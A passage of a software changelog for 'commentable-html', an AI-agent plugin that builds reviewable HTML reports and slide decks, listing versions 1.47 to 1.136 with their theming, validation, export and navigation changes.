- Made the previously hard-coded-dark deck code-control surfaces themeable so light decks stay legible: the code/KQL language + copy badge background (`--cmh-deck-code-badge-bg`), the KQL run-link hover colour (`--cmh-deck-code-link-hover-fg`), and the Mermaid subgraph cluster fill/stroke (`--cmh-deck-mermaid-cluster-fill`/`-stroke`), each with byte-exact dark defaults so unthemed and `terminal` decks are unchanged.

## [1.136.0] - 2026-07-17

### Changed

- Recorded the verified license and commit for the vendored `bold-template-pack` in `vendor/frontend-slides/UPSTREAM.md` and added an explicit `bold-template-pack/LICENSE`. The pack originates from `zarazhangrui/beautiful-html-templates` (MIT, Zara Zhang, commit `e5e204fb`), a different upstream repo than frontend-slides; both are MIT by the same author, so adapting a bold template into a native CMH deck preset is now license-cleared (unblocks the Phase 2 bold presets; issue #337).

## [1.135.0] - 2026-07-16

### Added

- Native deck theme presets that incorporate the frontend-slides design system directly into the deck engine, replacing per-deck hand-translation of vendored reference material. A preset is a named JSON profile under `tools/deck/themes/<name>.theme.json` of allowlisted, system-font, contrast-safe deck tokens; `deck_scaffold.py --theme <name>` builds a fully styled deck and the new `deck_theme.py apply --theme <name>` re-themes an existing deck in place. Re-theming is idempotent and comment-safe: the theme block is `cm-skip`, so it never shifts stored comment offsets. Ships the `terminal` preset (dark/technical, system monospace), adapted from the frontend-slides "Terminal Green" style (Zara Zhang, MIT). Deck component colours (syntax tokens, table headers, diff, mermaid) and the link/border are now themeable via `var(--token, <default>)` with byte-exact defaults, plus reusable recipe classes (`.cmh-slide-section`, `.cmh-slide-lede`, `.cmh-cols-2`, `.cmh-metric-grid`, `.cmh-pill`) so a themed deck needs no per-deck CSS. `deck_validate.py` gates every themed contrast pair (compositing the translucent diff rows for a faithful check). Supersedes the vendor-first deck design routing from issue #208; the vendored `frontend-slides` subtree is retained as design provenance and the maintainer refresh source (CMH-DECK-THEME-01/02/03, CMH-DECK-14; issue #334).

## [1.134.0] - 2026-07-16

### Changed

- Polished the showcase deck with a concrete Copy all bundle specimen in the technical section, a tighter medium-comparison table, and a corrected Mermaid-node callback so the pitch is more informative without changing the deck contract (CMH-DECK-SHOWCASE-09, closes #244).

## [1.132.0] - 2026-07-16

### Added

- Deck design playbook: a new CHM-specific `references/deck-design.md` (fill the fixed stage, capture-safe motion, wayfinding, pain-before-mechanism narrative, review-surface patterns, card variety, contrast/clip discipline) plus SKILL.md "ask first" up-front questions that route deck planning to it, salvaged from the corrupted #279 branch (CMH-DECK-22, closes #332).

## [1.131.0] - 2026-07-16

### Added

- Offline export now embeds vendored copies of the rich-content JavaScript libraries (mermaid, Chart.js) so an exported Offline artifact renders diagrams and interactive charts with zero network access (issue #296).

## [1.130.0] - 2026-07-16

### Changed

- Deck showcase polish: added the linked Commentable HTML brand button, distinct Overview/counter nav chrome, a static "make it clearer" comment mockup on the Act 1 After card, richer point-at/install pills, and a supported-languages plus notes-demo slide while preserving the restructured deck flow, the interactive chart, and the new edge-navigation runtime.

## [1.129.0] - 2026-07-16

### Fixed

- Dark KQL caption surfaces now keep the `Run in Azure Data Explorer` link at AA contrast in both
  report dark theme and deck mode, and deck Mermaid connectors/arrows now render darker and thicker
  so they stay readable on the light parchment slides. (CMH-KQL-04, CMH-DECK-09, CMH-DECK-13)

### Added

- `tools/validate/cmhval/contrast.py` now resolves computed descendant text/background pairs and
  low-contrast connector strokes, so `deck_validate.py` catches the old red-on-dark KQL link and
  washed-out diagram arrows before publish. (CMH-DECK-12)

## [1.126.0] - 2026-07-16

### Fixed

- Mermaid checker (`cmhval/mermaid.py`, CMH-SYN-01): flag a `sequenceDiagram` message whose `;` leaves an arrow-free tail (a bare word or ordinary prose, e.g. `A->>B: hi; take entities as-is`), not only an arrow-without-colon tail. Once the first `;`-segment is a real signal, any tail that is not another full signal, a keyword-led statement, or empty is a broken second statement the real parser rejects; the broadened rule stays zero-false-positive (proven against the real-parser corpus). Fixes issue #324.

## [1.125.0] - 2026-07-16

### Changed

- Simplified the showcase deck copy: shorter install guidance, plain-language prompts,
  clearer "paste Copy all and press Enter" review flow, and fewer repeated account/server
  comparisons. (deck issue #290)

## [1.124.0] - 2026-07-16

### Added

- Deck charts can now render from inline canvas data without a remote chart library: the
  showcase deck's watering chart is drawn by the shipped runtime, hovering a bar shows a
  clipped-safe tooltip with the bed label and exact value, and the rendered canvas still
  snapshots cleanly for Offline export. (CMH-DECK-20)
- Deck table cells now animate a subtle hover highlight that keeps the cell text readable
  while making individual review targets easier to spot in the slide. (CMH-DECK-21)
## [1.119.0] - 2026-07-16

### Fixed

- Deck runtime: commenting across the two cards on the "Authoring is deterministic" slide no longer paints an empty highlight over the grid gap (issue #294).
- Deck triage board: the Locked-column Add Comment affordance no longer overlaps the Reset moves button (issue #294).

## [1.118.0] - 2026-07-16

### Added

- Deck navigation: dimmed edge hover-arrows for previous/next slide and Enter/Space to advance when the deck stage is focused (issue #292).

## [1.117.1] - 2026-07-16

### Changed

- Split the shipped layer validator check module into focused assembled topic parts while preserving the public `check_layer` entry point and validation behavior.

## [1.117.0] - 2026-07-16

### Added

- Document-overview strip for report/plan documents: a `cm-skip` `div.cmh-doc-stats` placed
  directly under the `<h1>` title shows the section count, word count, and approximate reading time
  (words / 200 wpm, rounded up). `tools/authoring/doc_stats.py` computes and injects it, and
  `new_document.py`, `finalize.py`, and `retrofit.py` bake it by default for report/plan documents
  (opt out with `--no-stats`). It is idempotent (counts refresh in place), excluded from its own
  word count, and baked into the content so it survives Plain / Standalone export. (CMH-STATS-01)
- Per-version upgrade anti-regression corpus under `dev/upgrade-corpus/`: `tests/test_upgrade_corpus.py`
  upgrades each checked-in fully layered snapshot with the current `tools/authoring/upgrade.py` and
  asserts a strict-clean, idempotent result, so a layer or tool change that breaks upgrading a
  document produced by an older version fails the gate. Snapshots are added per change when a
  version warrants one. (CMH-TOOL-20)

### Fixed

- The generated table of contents no longer double-numbers author-numbered sections. When a heading
  already begins with a section number (for example `1. Executive summary`), `generate_toc.py` strips
  the redundant leading number from the ordered-list entry so the `<ol>` supplies the single number,
  and `finalize.py` / `retrofit.py` de-dup an existing author `<ol>` `.cm-toc` in place. A `<ul>`
  `.cm-toc` (where the author supplies the number deliberately) is left untouched. (CMH-TOC-10)

## [1.116.0] - 2026-07-16

### Changed

- Reworked the showcase deck's Act 4 "behind the scenes" run so it now teaches the
  deterministic region split, the website-style portability model, how the skill is
  assembled from `SKILL.md`, on-demand references, and authoring/validation tools,
  plus the cross-platform Playwright-and-Python validation methodology behind the
  shipped experience. (CMH-DECK-SHOWCASE-06)

## [1.115.0] - 2026-07-16

### Added

- The runtime footer now shows a small copy icon that copies the creating AI agent's
  session id to the clipboard when the document carries a `commentable-html-session-id`
  provenance stamp; the button's accessible label and tooltip name the agent (Copilot or
  Claude), and the control never leaks into a Plain HTML export. (CMH-FOOT-04)
- The document-producing tools (`new_document.py`, `deck_scaffold.py`) stamp that session
  id by default, taking it from `--session-id` or, when absent, an auto-detected
  environment variable (`COPILOT_AGENT_SESSION_ID` for Copilot, `CLAUDE_CODE_SESSION_ID`
  for Claude). `--agent` overrides the label and `--no-session-id` opts out. When several
  agents' session ids are visible at once (a nested launch), the agent actually running the
  tool wins. A local, non-CI live check that drives the real `copilot`/`claude` CLIs is at
  `dev/tests/copilot_e2e_check.py` and `dev/tests/claude_e2e_check.py`. (CMH-STAMP-04)

## [1.108.1] - 2026-07-16

### Changed

- Restructured the showcase deck's narrative flow: added a dedicated header/pitch slide,
  moved the website-style medium comparison and shipped-example prompts earlier, removed
  the redundant recap slide, and replaced the close with a "What's next?" hub plus a
  trailing "Questions?" slide while keeping the shipped widget defaults unchanged.
  (CMH-DECK-SHOWCASE-05)
## [1.107.0] - 2026-07-16

### Changed

- Hardened the information-density advisory (CMH-VAL-15) for authoring edge cases: an inline
  `cm-skip` inside a paragraph now excludes only its own text instead of splitting the paragraph;
  sections are tracked as a heading stack so nested and headless sections are labeled by their own
  heading and two distinct prose walls are each reported; a stray or unmatched `</section>` no
  longer suppresses a genuine wall; and a `<section>` embedded in a layout block no longer reframes
  the enclosing prose section. (CMH-VAL-15)

## [1.106.0] - 2026-07-16

### Added

- `deck/deck_validate.py` now emits a non-fatal per-slide or board-card overload advisory
  when authored content exceeds tunable line or element budgets, helping authors split dense deck
  content before sharing. (CMH-DECK-19)

## [1.105.0] - 2026-07-16

### Changed

- Split the Chart.js reference into focused embedding/tooltips and recipes/data-hygiene guides, leaving `charts.md` as a thin router so agents can load only the chart guidance they need. (CMH-DOC-16)

## [1.104.0] - 2026-07-16

### Added

- `npm run shots` now regenerates all tutorial screenshots from the community-garden example with
  pinned capture state, and `npm run shots:check` plus `rebuild_all.py --check` catch missing or
  stale committed tutorial screenshots before the site syncs them. (CMH-TUT-SHOTS-01)

## [1.102.0] - 2026-07-16

### Added

- The validator now emits a non-fatal information-density advisory for `report` and `plan`
  documents: it warns when a section is a wall of four or more consecutive long paragraphs with no
  table, list, figure, diff, chart, or diagram to break it up, nudging authors toward a real
  skimmable layout. The check uses a dedicated density pass scoped to `#commentRoot`, ignores
  `cm-skip` and paragraphs nested inside layout blocks, resets at any layout block, heading, or
  section boundary, and runs only for `report` and `plan` (`slides`, `board`, `generic`, and a
  missing or unknown kind are exempt). Its thresholds are tunable. (CMH-VAL-15)

## [1.101.0] - 2026-07-16

### Added

- The flat-document validator now checks authored `--cp-*` theme overrides for WCAG contrast,
  evaluating the light and dark theme environments separately so a token overridden only in one
  theme is judged against that theme's value. It runs only on tokens changed from the shipped
  defaults (the accepted defaults are never flagged): text and link pairs use a 4.5:1 target (a
  3.0-4.49:1 near-miss is an advisory warning, below 3.0:1 is an error) and non-text UI pairs use
  a 3.0:1 bar. An override that cannot be resolved to two concrete colors is reported as
  'not evaluated' (a static check, no computed-style parity). A new `--suggest` flag prints a
  compliant nudged value when one is reachable, and the near-miss/unresolved advisories stay out of
  `retrofit.py`'s hard-fail path unless the contrast is actually bad. (CMH-THEME-02)

## [1.100.0] - 2026-07-16

### Added

- Added `tools/deck/deck_fix_fonts.py` to strip copied remote deck font loaders and
  deterministically map web-font stacks to approved system stacks before deck validation.
  (CMH-DECK-18)

## [1.98.0] - 2026-07-16

### Added

- `new_document.py`, `retrofit.py`, and `deck_scaffold.py` now accept `--brand brand.json`
  to stamp validated `--cp-*` theme tokens plus optional local data-URI font faces into
  generated documents, reject unknown or injection-shaped token values, and print a
  low-contrast advisory for unsafe brand color pairs. (CMH-TOOL-19)

## [1.96.0] - 2026-07-16

### Fixed

- Clear now restores slot-level draggable boards to their load-time sibling order,
  including interleaved non-part nodes, while clean boards are left untouched.
  (CMH-BOARD-05)

## [1.94.0] - 2026-07-16

### Added

- Authors can set `data-cm-density="compact"` or `data-cm-density="comfortable"` on
  `#commentRoot` to tune review chrome spacing and font scale through shared
  `--cp-chrome-*` tokens, while documents without the attribute keep the existing
  default density. (CMH-DENSITY-01)

## [1.93.0] - 2026-07-16

### Added

- `tools/authoring/recommend_kind.py` now recommends `--kind report`, `--kind plan`, or
  `--kind slides` from filename and content signals, prints the evidence behind the
  recommendation, and emits advisory mismatch warnings when an explicit kind contradicts
  the signals without changing the chosen kind. (CMH-KIND-04)

## [1.92.0] - 2026-07-16

### Added

- Deck documents now deep-link by stable `data-slide-id`: loading a slide hash opens that slide,
  slide navigation updates the URL hash with `history.replaceState`, and browser hash changes
  navigate without adding runtime history entries. (CMH-DECK-17)

## [1.88.0] - 2026-07-16

### Added

- Flat commentable documents now print and export to PDF cleanly: print media hides runtime chrome,
  expands collapsed sections, resets fixed or shadowed UI into a readable paper flow, appends current
  comments as a print-only appendix, and keeps decks at one slide per page. (CMH-PRINT-01)

## [1.87.0] - 2026-07-16

### Added

- The layer now honors the operating-system "reduce motion" setting
  (`prefers-reduced-motion: reduce`): non-essential animations and transitions (the composer flash,
  the mermaid and diff pulses, the checklist and notes flashes) - including their delays and
  repeat loops - are clamped to a near-instant single pass so they do not animate for
  motion-sensitive readers, while everything still lands in its final state. Programmatic smooth
  scrolls (jump-to-comment, scroll-to-top/bottom, deep links) also become instant under the
  preference. (The deck slide stage keeps the vendored slide engine's own reduced-motion rule for
  its essential slide transition.) (CMH-A11Y-07)

## [1.86.0] - 2026-07-16

### Fixed

- `new_document.py --out` now preserves an existing target by writing the first free
  `-2` / `-3` suffixed sibling unless `--force` is supplied, and derives `--key auto`
  from that final resolved path so colliding document creations do not share keys.
  (CMH-TOOL-18)

## [1.85.0] - 2026-07-16

### Fixed

- Updated stale shipped-doc tool paths, including the plugin README's validation,
  document-creation, and handled-comment paths, to the current `tools/<topic>/...` buckets.
  Added a docs test so future tool-layout refactors cannot leave stale README paths behind.
  (CMH-DOC-15)

## [1.82.0] - 2026-07-16

### Added

- The shipped skill now carries the MIT `LICENSE` at its root, so every copy that ships (the
  Copilot/Claude `plugin install` source subtree and the Claude Desktop skill ZIP) redistributes the
  code with its required license notice. (CMH-DOC-14)

## [1.81.0] - 2026-07-16

### Added

- Callouts now carry a non-color cue so their meaning survives grayscale printing,
  color-blindness, and screen readers: each variant (info/success/warning/danger) shows a distinct
  leading glyph, and the runtime stamps `role="note"` with a variant label. An authored leading
  `<strong>` label (or an explicit `aria-label`) is respected so the variant is not announced twice.
  (CMH-CALLOUT-03)

## [1.80.0] - 2026-07-15

### Added

- The wide-screen side navigation menu now has a filter box that searches AS a filter over the
  document: typing hides each matching entry's section (for section-wrapped content) and always its
  menu entry, Escape clears it, and following a link or comment jump to a filtered-out section reveals
  and expands it instead of scrolling to nothing. Filtered sections are hidden with `display:none`
  (comment offsets are unaffected) and are never marked current by the scroll-spy. (CMH-TOC-09)
- The side-navigation scroll-spy now marks the current section's link with
  `aria-current="location"` (kept unique and cleared from the others), so screen readers announce
  the reader's location instead of relying on the visual highlight alone. (CMH-TOC-08)

## [1.79.0] - 2026-07-15

### Changed

- The shipped plugin `README.md` now documents the dual-agent install story (both Claude Code and the
  GitHub Copilot CLI, with the marketplace-add and install commands for each), matching the SKILL.md,
  the marketplace manifests, and the site.

## [1.78.0] - 2026-07-15

### Changed

- Deck presentation chrome is cleaner and stays out of the way. The corner comment-mode toggle now
  hides at every width while the comment side panel is open (its accent colour read poorly over a
  slide, and the panel has its own header controls); hiding the panel brings it back so present mode
  stays reachable. The comments action toolbar (Copy all / Show / ...) no longer appears in a deck at
  all: only the single corner icon and the slide nav bar show. When the panel is hidden in comment
  mode the slide stage spans the full screen width again instead of leaving a reserved black bar.
  (CMH-DECK-15)
- The split-screen slide overview is easier to read and use. Its panel now has a light accent-tinted
  (red-ish) background, the Close button uses the regular accent fill, and the slide count appears
  next to the "Slide overview" title. Clicking the main deck area (outside the panel) closes the
  overview, the grid scrolls reliably when the slides overflow the viewport height, and thumbnails
  force-reveal animated slide content so each one previews the slide's final rendered state.
  (CMH-DECK-16)

## [1.77.0] - 2026-07-15

### Changed

- SKILL.md now states the plugin installs into both Claude Code and the GitHub Copilot CLI and is
  invokable from each agent's CLI and Desktop app, so the dual-agent support is visible in the
  shipped skill doc (its output was always a portable, agent-agnostic HTML file). (CMH-DOC-12)

## [1.76.0] - 2026-07-15

### Changed

- Reworked the showcase deck (`examples/deck-showcase.html`) into a light "Parchment and Amber"
  five-act pitch (pinned `data-theme="light"`, raspberry accent, amber decorative highlight on key
  title words, indigo ink body) that threads a single community-garden plan as its one running
  example instead of unrelated feature samples. Acts 1 to 3 speak to a non-technical viewer and end
  on the primary call to action, Act 4 is the engineers-only deep dive (chart, diff, code, KQL,
  triage board, checklist), and Act 5 is a room-wide close. Retitled the slides to outcome-focused
  headings and rebuilt the shipped and site copies. (CMH-DECK-SHOWCASE-01, CMH-DECK-SHOWCASE-02)
- Rethemed the deck's rich content for the light parchment slides: the chart, Mermaid diagram, code
  diff, syntax-highlighted code and KQL, drag-and-drop triage board, table headers, and layered
  checklist all stay legible and pass the strict contrast validator on the new theme.
  (CMH-DECK-08, CMH-DECK-09, CMH-DECK-10, CMH-DECK-13)

### Added

- Early install call to action: the deck now surfaces both agents' exact install commands (Copilot
  and Claude `plugin marketplace add` plus `plugin install commentable-html@urikan-ai-marketplace`)
  as code blocks on an Act 2 slide well before the close, alongside the live-demo, GitHub, and
  tutorial links, and again as the primary CTA and the closing slide - so a viewer can act within
  the first few minutes rather than only at the end. (CMH-DECK-SHOWCASE-03)

## [1.75.0] - 2026-07-15

### Added

- Section-card auto-wrap for report/plan documents - the deterministic fix for the CMH-VAL-14
  flat-section warning. `tools/authoring/wrap_sections.py` wraps each bare top-level `<h2>` block
  (the heading plus the siblings up to the next top-level `<h2>`) in
  `<section aria-labelledby="the-h2-id">` so a `report`/`plan` renders as boxed section cards
  (`#commentRoot > section`), leaving the title/lede above the cards. It is idempotent, a no-op when
  a top-level `<section>` already exists, and scopes to the `#commentRoot` element for a full
  document or the fragment root for a bare fragment. `new_document.py` (report/plan fragments) and
  `finalize.py` (full docs, gated on the kind meta) run it by default; opt out with
  `--no-wrap-sections`. (CMH-TOOL-17)

### Fixed

- `build.py` now re-stamps the version into the Claude Code manifests (`.claude-plugin/plugin.json`
  and `.claude-plugin/marketplace.json`) alongside the Copilot ones, so a version bump no longer
  leaves the Claude mirror behind (which previously required a manual bump and could fail the
  claude-manifest / version-bump guards). (CMH-TOOL-06)

## [1.74.0] - 2026-07-15

### Added

- Validator warning (non-fatal) when a report/plan/generic document has two or more top-level
  `<h2>` headings with no `<section>` wrapper, so authors restore the boxed section-card
  layout (`#commentRoot > section`). Sectioned content, single-heading docs, and slides/boards
  do not warn. (CMH-VAL-14)

## [1.73.0] - 2026-07-15

### Changed

- Deck authoring: the SKILL.md deck section now routes deck planning (not only the fill step) to
  the vendored frontend-slides design system - shortlist templates from `selection-index.json` and
  read `STYLE_PRESETS.md` / `html-template.md` / `animation-patterns.md` to choose the outline
  and theme before scaffolding. (CMH-DECK-14)

## [1.72.0] - 2026-07-15

### Added

- Claude Code compatibility. The plugin now ships a `.claude-plugin/plugin.json` alongside the
  Copilot `plugin.json`, and the repo publishes a `.claude-plugin/marketplace.json`, so
  commentable-html installs in Claude Code (`claude plugin marketplace add ...` then
  `claude plugin install commentable-html@urikan-ai-marketplace`) as well as the GitHub Copilot
  CLI. A new `scripts/validate_claude_compat.py` validates the Claude manifests structurally and,
  when the `claude` CLI is on PATH, runs `claude plugin validate --strict` on the marketplace and
  each plugin. (CMH-CLAUDE-01)

## [1.71.0] - 2026-07-15

### Changed

- Pitch: the plugin `README.md` and the site plugin page now surface two value props of the existing
  review flow. First, comments persist in the browser's `localStorage` and survive a browser restart
  or a machine reboot while you iterate, so in-progress review work is not lost (a new "Comments
  survive a restart" card in "What you get"). Second, one `Copy all` returns every comment at once,
  so the agent makes a single coordinated, coherent edit across all your notes instead of a fragile
  one-at-a-time pass (the README `Copy all` bullet and the site "Round-trip to the agent" card now
  say so). No runtime behavior changed; this is documentation and pitch copy for behavior that
  already ships.

## [1.70.0] - 2026-07-15

### Added

- A visible, human-readable version line in the shipped `SKILL.md` and `dist/README.md`, so a reader
  who opens the skill or its `dist/` folder can see which version they have without decoding
  `manifest.json`. The line (`**Version:** ` + a code span) is single-sourced from `dev/VERSION`:
  `build.py` re-stamps it and `--check` fails when either file is stale.

## [1.66.0] - 2026-07-15

### Added

- Provenance stamps and a runtime fallback banner so a document that skipped validation is visible.
  The document-producing tools stamp `commentable-html-created`, and `validate.py` / `finalize.py`
  stamp `commentable-html-validated` only on a strict-clean pass (`--no-stamp` keeps a run read-only).
  On load, the runtime shows a small dismissible amber banner when a document carries a created stamp
  but no current validated stamp - a produced-but-never-strict-validated document. A strict-validated
  document (and any document with no created stamp) shows nothing. This is a last-resort signal; the
  skill MUST always finalize and strict-validate before handoff.

## [1.65.0] - 2026-07-15

### Added

- Editable notes fields: an authored `data-cmh-note` element becomes an editable plain-text
  `<textarea>` (with a single/multi-line toggle) whose baseline is its authored text. A reviewer's
  edit is tracked as a minimal `localStorage` delta, surfaces as a per-note change card (jump +
  reset, searchable), flips the badge to Not portable, is written into the Copy-all bundle as
  `NOTES_STATE_JSON`, and is baked into the source on export. `tools/notes/notes_scaffold.py`
  generates the markup and `tools/notes/notes_apply.py` deterministically cements an edit back into
  the source HTML, so the reviewer-edit round-trip is closed and covered end to end. The global
  Clear all comments also reverts note edits. Ships a `report-notes.html` demo. See the editable
  notes-field contract reference (`references/notes-contract.md`) in the skill. Notes can be marked
  foldable (`data-cmh-note-foldable`) to render as a `+`/`-` disclosure that reveals the field on the
  line below.

## [1.64.0] - 2026-07-15

### Changed

- KQL code blocks must now be runnable or explicitly marked clusterless. A bare
  `<pre><code class="language-kusto">` block that is not framed in a `figure.cmh-kql` with a
  Run in Azure Data Explorer link is now a hard validation error unless the `<pre>` carries an
  explicit `data-cmh-kql-no-cluster` marker (declaring there is genuinely no cluster to run it on).
  Previously a bare KQL block was silently exempt, so a query could ship with no way to run it and
  no cluster. Prefer providing a real cluster; `kql_highlight.py --code-only` now stamps the
  `data-cmh-kql-no-cluster` marker for the rare clusterless case.
- The showcase deck's KQL slide now uses a full runnable figure on the public
  `help.kusto.windows.net` cluster instead of a bare highlighted block.

## [1.63.0] - 2026-07-15

### Changed

- The document-producing tools now bake syntax highlighting by default and surface validator
  warnings instead of discarding them, so a freshly created document is never raw. Previously baking
  lived only in the separate, manual `finalize.py` step, so a document that skipped finalize shipped
  with monochrome code. `new_document.py`, `retrofit.py`, and `deck_scaffold.py` all bake highlighting
  by default (opt out with `--no-highlight`); `new_document.py` and `deck_scaffold.py` print validator
  warnings, and `retrofit.py` continues to fail closed on any warning so it never writes a raw document.
- `SKILL.md` now states as a MUST that every produced HTML is finalized and strict-validated before
  handoff, since the runtime and validator both depend on that final pass.

## [1.62.0] - 2026-07-15

### Fixed

- Raw `language-html` and `language-xml` code blocks that shipped without baked highlighting now
  self-highlight at runtime like every other supported language. The runtime fallback tokenizer only
  fired for languages it knew, and the markup family (html/xml) was missing from that set, so an
  unbaked markup block rendered as plain monochrome text (css/js blocks already self-healed). The
  runtime now colors tag names, attribute-value strings, and `<!-- -->` comments for markup.

### Added

- A drift guard test asserts the runtime tokenizer knows every language the author-time highlighter
  supports, so a supported language can never again ship without runtime highlighting.

## [1.61.0] - 2026-07-15

### Changed

- The comments panel can no longer be dragged so narrow that its controls clip. The resize floor
  is now 256px (was 192px on wide screens and 144px on narrow), the empirically measured minimum at
  which the two-per-row export button labels (`Portable`, `Offline`, `Markdown`, `Plain HTML`) and
  the `Search comments` placeholder stay fully legible; the CSS `min-width` floor matches so the pane
  never renders narrower.
- Widened the comment search field by trimming its side padding and the shown/total count reserve, so
  the full `Search comments` placeholder fits even at the minimum panel width.

## [1.60.0] - 2026-07-15

### Fixed

- Validator now warns when normal `<pre>` or `<pre><code>` blocks carry `cm-skip`, which would make their code content non-commentable.
- Validator now rejects a live `#commentRoot` that still uses the documentation example key `my-doc`, while allowing the commented-out example.

## [1.59.0] - 2026-07-15

### Changed

- Reduced the always-loaded `SKILL.md` token footprint by replacing reference-duplicated guidance with concise pointers to the existing on-demand reference docs while keeping routing, validation, trust-boundary, iteration-loop, and deck invariants in the entry point.

## [1.58.0] - 2026-07-15

### Added

- Replaced the weak roadmap deck demo with a themed, in-depth Commentable HTML showcase deck and a reusable one-shot authoring prompt that prescribes the full slide outline and feature coverage.
- Added the showcase deck to the live site demo tabs so visitors can open the deck-mode review experience directly.

### Fixed

- Deck code, KQL, and diff blocks now use dark, readable surfaces, distinct syntax token colors, and readable add/delete row tints on dark deck slides.

## [1.57.0] - 2026-07-15

### Added

- Added a shipped `tools/validate/cmhval/contrast.py` WCAG contrast helper and wired
  `deck_validate.py` to fail decks whose explicit inline or same-rule CSS text/background color
  pairs fall below the configurable 4.5:1 default threshold, with diagnostics that name the
  selector or element and both colors.

### Fixed

- Hardened the contrast helper so malformed or non-finite `rgb()`/`rgba()` values are skipped
  instead of crashing, semi-transparent backgrounds are skipped, background shorthand follows
  declaration order, and colors embedded only inside `url(...)` or quoted strings do not create
  false positives.

## [1.56.0] - 2026-07-14

### Added

- Added a deck slide-overview navigator with a split-screen thumbnail grid, slide-title tooltips, click-to-jump navigation, and keyboard open, close, and select support in present and comment modes.
- Replaced the deck comment-mode text toggle with the commentable-html brand icon while preserving the Comment Mode tooltip, accessible name, and aria-pressed toggle behavior.
- Hardened the overview so thumbnail clones stay out of the tab order, preserve nested highlight markup, do not receive background deck navigation keys, and are stripped from offline exports.

## [1.55.0] - 2026-07-14

### Added

- Added the Commentable HTML brand icon to the toolbar overflow menu header as a decorative
  top-right mark that does not change the menu's keyboard order.
- Added a Help and About changelog link to the commentable-html plugin changelog.

### Changed

- Copy all now exposes a disabled, tooltip-backed state when there is no copyable review state, and
  re-enables automatically once comments are available.
- Clear now restores checklist state edits and draggable board moves to their authored baselines in
  addition to deleting comments.
- The Help and About author link now has a visible underline and accent color so it reads as a link.

## [1.54.0] - 2026-07-14

### Fixed

- Deck roadmap risk board cards can be dragged between columns inside the scaled deck stage.
- Mermaid diagrams on dark deck slides now render with high-contrast nodes, labels, and connectors.
- Deck table headers now keep readable label contrast on dark slides.

## [1.53.0] - 2026-07-14

### Changed

- Split the 1,959-line `tools/validate/validate.py` into focused, single-purpose modules under a new
  `tools/validate/checks/` package (`parsing`, `resources`, `kind`, `charts`, `checklist`,
  `highlighting`, `layer`), leaving `validate.py` as a thin entry point and orchestrator that
  re-exports each module's public names. The content-syntax checks continue to live in the sibling
  `cmhval/` package. This is a pure internal refactor with no behavior change: every existing test
  passes unchanged and the validator's output on every shipped example and template is identical.
- Decomposed the ~460-line `check_layer` into a 94-line orchestrator plus focused per-check helpers
  (region markers, content root, state JSON blocks, element ids, self-contained resources, KQL, diff
  blocks, headings, and more), so each layer invariant is its own small, testable function.

### Development

- Added CLI tests for `validate.py`'s `-h`/`--help` output and the `--` end-of-options separator
  (`ValidateMainTests`), and refreshed the `CMH-VAL-11` / `CMH-CONTENT-16` spec source pointers to the
  new module paths.


## [1.52.0] - 2026-07-14

### Changed

- Comment search now filters by the comment note text only. A query that appears solely in the
  quoted anchor content (or the section path / pin) no longer keeps a card visible, so reviewers
  filter by what they wrote rather than by the surrounding quote. A query present in the note still
  matches, and the case-insensitive substring, shown/total count, clear button, and no-results
  behaviors are unchanged.

## [1.51.0] - 2026-07-14

### Changed

- Grouped the shipped runtime tools into per-topic buckets under `tools/<topic>/` (`deck`, `kusto`,
  `checklist`, `blocks`, `authoring`, `validate`), moving the former top-level `deck/` under
  `tools/deck/`. A shared `tools/_toolpath.py` bootstrap puts the tools root and every topic
  subdirectory on `sys.path` and exposes `SKILL_ROOT`, so a tool imports its siblings and resolves
  shipped resources (`dist/`, `vendor/`) regardless of which bucket it lives in. Invocation paths in
  `SKILL.md` and the references move to `tools/<topic>/<tool>.py`; there is no runtime behavior change.

## [1.50.0] - 2026-07-14

### Added

- Content-syntax validation in `tools/validate.py`, so a document with a broken mermaid diagram
  or invalid embedded JSON now FAILS validation instead of shipping and rendering as mermaid's
  "Syntax error in text" bomb:
  - Mermaid: a `sequenceDiagram` message that a `;` splits into a dangling statement (the text
    after the `;` carries a message arrow but no `:` message) is an error. The check is calibrated
    to zero false positives against a broad, real-parser-labeled corpus - a valid multi-signal
    (`A->>B: x; C->>D: y`), an arrow inside message text, a `participant ... as "a->b"` alias, an
    `accTitle:`/`accDescr:` directive, and an inline `%%{init}%%` directive or a `%%`, single `%`,
    or `#` comment are never flagged (all confirmed against the real mermaid v11 parser). Only
    `sequenceDiagram` is deep-checked in Python; every other diagram family (flowchart, class,
    state, ...) is delegated to the repo-side real-parser oracle, so a flowchart label with a `%%`
    or a literal quote is never a false positive. An empty mermaid block (which renders as
    mermaid's "No diagram type detected" error) is also flagged.
  - Embedded JSON: an empty or invalid `<script type="application/json">` data block (whose
    `JSON.parse()` would throw at runtime, including a `NaN`/`Infinity` literal or a raw
    `</script>` that truncates the block) is an error when no chart canvas owns it; the chart
    checks continue to own chart-data JSON when a canvas is present.
- The new checks live in a `tools/cmhval/` package (`mermaid.py`, `jsonblocks.py`) so the
  validator does not grow into one giant script; `tools/validate.py` stays the entry point.

### Development

- A repo-side real-parser oracle (`dev/tools/validate_render.mjs`, never shipped) validates every
  mermaid diagram and Chart.js config in the shipped example reports with the real mermaid and
  Chart.js in a headless browser, and re-verifies the differential corpus labels, so the repo
  cannot ship a diagram or chart that renders as a syntax-error bomb and the Python checker's
  zero-false-positive guarantee is gated by the authoritative parser in CI. The oracle also flags
  an empty/whitespace-only `<pre class="mermaid">` host (which the real parser rejects as "No
  diagram type detected") rather than silently skipping it.
- If the sibling `tools/cmhval/` package cannot be imported (a broken/partial install),
  `tools/validate.py` now fails CLOSED for content it would have inspected - a mermaid block or a
  non-layer JSON data block makes validation error instead of silently passing - while a document
  with no such content still validates and `--charts-only` is unaffected.

## [1.49.0] - 2026-07-14

### Changed

- Consolidated the skill's docs assets: the review-loop diagram and the tutorial screenshots now
  live together under `docs/assets/` (previously split across `docs/images/` and
  `docs/tutorial-images/`). Shipped references in `SKILL.md`, `README.md`, `TUTORIAL.md`, and the
  file inventory point at the new location; there is no runtime behavior change.

## [1.48.0] - 2026-07-14

### Added

- Prevent code blocks from shipping without syntax highlighting, in three layers:
  - Runtime fallback: the runtime now highlights any commentable `<pre><code class="language-XXX">`
    block that shipped without highlight spans, on load, so a labelled block never renders as plain
    monochrome text even when highlighting was never baked. It is idempotent, only fires for a
    language the tokenizer knows, and keeps line numbers and comment anchoring consistent.
  - `tools/highlight_document.py`: bakes highlighting into every raw, language-labelled code block
    of a file in one pass (with a `--check` mode). `tools/finalize.py` runs it by default (opt out
    with `--no-highlight`), so the standard finalization bakes highlighting.

## [1.47.0] - 2026-07-14

### Added

- The validator now catches a code block that was labelled with a language but never highlighted.
